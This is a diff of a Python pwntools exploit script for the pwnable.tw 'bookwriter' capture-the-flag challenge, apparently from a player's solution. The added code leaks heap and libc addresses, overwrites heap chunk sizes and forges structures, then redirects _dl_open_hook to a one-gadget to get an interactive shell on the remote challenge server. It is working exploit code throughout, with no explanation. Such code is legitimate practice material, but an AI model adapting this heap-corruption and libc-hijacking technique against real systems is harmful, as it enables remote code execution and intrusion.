@@ -5,23 +5,23 @@
 
 from pwn import *
 import os
-os.environ['LD_LIBRARY_PATH']="/dbg64/lib"
+context.arch="amd64"
 context.log_level="debug"
-
 pwn_file="./bookwriter"
-libc_address=0
 heap_address=0
-# libc=ELF("/dbg64/lib/libc.so.6")
+os.environ["LD_LIBRARY_PATH"]="./"
+libc=ELF("./libc.so.6")
+
 if len(sys.argv)==1:
     conn=process(pwn_file)
     pid=conn.pid
 else:
-    conn=remote("ww",4444)
-    #conn=remote("chall.pwnable.tw",10304)
+    context.proxy=(socks.SOCKS5,"10.211.55.2",1080)
+    conn=remote("chall.pwnable.tw",10304)
     pid=0
 
 def debug():
-    log.debug("libc address 0x%x"%libc_address)
+    log.debug("libc address 0x%x"%libc.address)
     log.debug("heap address :0x%x"%heap_address)
     log.debug("process pid:%d"%pid)
     pause()
@@ -57,20 +57,59 @@ def edit(index,name):
     conn.sendafter("Content:",name)
 
 login("a"*0x40)
-add(0x300,"a"*0x300)# 0
-heap_address=u64(inform(False)[0x40:].ljust(8,"\x00"))-0x10
-add(0x308,"a"*0x308)# 1
-edit(1,"a"*0x308)
-edit(1,"a"*0x308+p64(0x109d1)[:3])
-add(0x10a00,"a")#2
-edit(1,"a"*0x308+p64(0x32001)[:3])
-add(0x1f000,"a")#3
-add(0x10000,"a")#4
+inform(False)
+add(0x1008,"a"*0x1008)#0
+heap_address=u64(inform(False)[0x40:].ljust(8,"\x00"))-0x1020
 
-add(0x3000,"a"*0x1a08)#5
-debug()
-edit(5,"a"*0x1a08)
-edit(5,"a"*0x1a08+p64(0xbe1)[:2])
-add(0x2000,"a")
-debug()
+edit(0,"a"*0x1008)
+edit(0,"a"*0x1008+p64(0x10fe1)[:3])
+add(0x11000,"a"*0x1000)#1
+edit(0,"a"*0x1008+p64(0x31fe1)[:3])
+
+add(0x18,"a"*8)#2
+libc.address=u64(show(2)[8:].ljust(8,"\x00"))-0x3c4328
+add(0x20000,"a")#3
+f={
+    0x28:0x101,
+    0x38:heap_address+0x220a0,
+    0x48:0x401,
+    0x58:heap_address+0x22030,
+    0x90:libc.address+0x72AE7,# call [rax+0x68]
+    0x98:0x421,
+    0xa8:heap_address+0x220d0,
+    0xc8:0x101,
+    0xd8:heap_address+0x22100,
+    0x90+0x58:libc.address+0xf0567,
+    0x90+0x68:libc.address+0x6fd91,# call [rax+0x58]
+}
+edit(1,fit(f,filler="\x00"))
+add(0xf0,"a")#4
+f={
+    0x18:0x401,
+    0x28:libc.symbols["_dl_open_hook"]-0x10,
+    0x38:libc.symbols["_dl_open_hook"]-0x20,
+}
+edit(4,fit(f,filler="\x00"))
+
+add(0xf0,"a")
+conn.sendlineafter("Your choice :","1")
+conn.sendline("12")
+
 conn.interactive()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
